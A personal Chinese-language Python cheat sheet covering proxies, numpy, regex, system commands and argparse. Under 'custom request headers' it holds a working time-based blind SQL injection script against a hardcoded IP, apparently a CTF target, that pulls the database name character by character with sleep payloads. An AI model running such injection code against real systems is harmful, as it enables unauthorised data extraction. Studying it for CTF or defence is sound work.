# python

## requests 模块 使用代理

requests使用代理要比urllib简单多了…这里以单次代理为例. 多次的话可以用session一类构建.

如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求:

```python
import requests

proxies = {
  "http": "http://10.10.1.10:3128",
  "https": "http://10.10.1.10:1080",
}

r=requests.get("http://icanhazip.com", proxies=proxies)
print r.text


```



### 使用全局代理



```python
import socks
import socket
from urllib import request
from urllib.error import URLError

socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9742)
socket.socket = socks.socksocket
try:
    response = request.urlopen('http://httpbin.org/get')
    print(response.read().decode('utf-8'))
except URLError as e:
    print(e.reason)
```



## numpy

### 解多元一次方程

> x+y=10
> x+z=20
> y+z=24

```python
import numpy as np
#导入指定成员
from scipy.linalg import solve 
a = np.array([[1, 1,0], [1,0,1], [0,1, 1]])
b = np.array([10, 20, 24])
x = solve(a, b)
print(x)
```



## python 装饰器

 https://foofish.net/python-decorator.html 



## python命令行

### 命令行参数读取

`sys.argv[x]`



## Python执行系统命令并获得输出




```python
import os
 
print(os.popen('uptime').read())

 
```



```python
import subprocess
 
res = subprocess.Popen('uptime',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)
result = res.stdout.readlines()
 
```



## 自定义请求头



```python
import requests
import hackhttp 
import urllib
import socket

ip = '111.186.57.61'
port = 10601

def send_raw(raw):

    try:
        with socket.create_connection((ip, port), timeout=2) as conn:
            conn.send(bytes(raw,encoding="ascii"))
            res = conn.recv(10240).decode()

    except:
        return True
    
    return False



def rawhttp(sql):
    sql=urllib.parse.quote(sql)
    burp0_url = "http://111.186.57.61:10601/?age={}".format(sql)
    raw='''GET /?age={} HTTP/1.1
Host: 111.186.57.61:10601
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 0
Content-Length: 0

'''.format(sql).replace("\n","\r\n")
    return send_raw(raw)


l='0123456789ABCDEF'
result=""
for j in range(10):
    for i in l:
        sql="if((select substr(hex(database()),{},1))=char({}),sleep(10),0)".format(j+1,ord(i))
        if rawhttp(sql):
            result+=i
            print(result)
            break
        else :
            print("第{}个字符不是{}".format(j+1,i))
        




```



## 正则

### re.match函数

re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。

**函数语法**：

```
re.match(pattern, string, flags=0)
```

### re.search方法

re.search 扫描整个字符串并返回第一个成功的匹配。

函数语法：

```
re.search(pattern, string, flags=0)
```



###  将字符串中的匹配的数字乘以 2 

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
 
import re
 
# 将匹配的数字乘以 2
def double(matched):
    value = int(matched.group('value'))
    return str(value * 2)
 
s = 'A23G4HFD567'
print(re.sub('(?P<value>\d+)', double, s))
```



## dir()和`__dict__`的区别

最简单的一句发是`__dict__`是dir的子集合



 https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981 



所以以后查看对象的所有属性一定要用dir()



## 参数解析

### Argparse



#### 模板



```python
import argparse
parser = argparse.ArgumentParser(description="calculate X to the power of Y")#程序帮助
parser.add_argument('-v','--version',default=0,type=int,action='store_true',nargs="+")
#add_argument default设置参数默认值,type代表参数值类型,action代表拿到参数后执行的动作,nargs 代表参数个数
#action大全
#'store' - 存储参数的值。这是默认的动作。
#'store_const' - 存储被 const 命名参数指定的值。
#'store_true' and 'store_false' - 这些是 'store_const' 分别用作存储 True 和 False 值的特殊用例。
#'append' - 存储一个列表，并且将每个参数值追加到列表中。在允许多次使用选项时很有用。
#'append_const' - 这存储一个列表，并将 const 命名参数指定的值追加到列表中。（注意 const 命名参数默认为 None。）``'append_const'`` 动作一般在多个参数需要在同一列表中存储常数时会有用。
#'count' - 计算一个关键字参数出现的数目或次数。
#'extend' - This stores a list, and extends each argument value to the list. 

#设置冲突选项
group = parser.add_mutually_exclusive_group()
group.add_argument("-v", "--verbose", action="store_true")
group.add_argument("-q", "--quiet", action="store_true")

#

```





#### 实例



```python
import argparse

parser = argparse.ArgumentParser(description="calculate X to the power of Y")
group = parser.add_mutually_exclusive_group()
group.add_argument("-v", "--verbose", action="store_true")
group.add_argument("-q", "--quiet", action="store_true")
parser.add_argument("x", type=int, help="the base")
parser.add_argument("y", type=int, help="the exponent")
args = parser.parse_args()
answer = args.x**args.y

if args.quiet:
    print(answer)
elif args.verbose:
    print("{} to the power {} equals {}".format(args.x, args.y, answer))
else:
    print("{}^{} == {}".format(args.x, args.y, answer))
```



```shell
$ python3 prog.py --help
usage: prog.py [-h] [-v | -q] x y

calculate X to the power of Y

positional arguments:
  x              the base
  y              the exponent

optional arguments:
  -h, --help     show this help message and exit
  -v, --verbose
  -q, --quiet
```

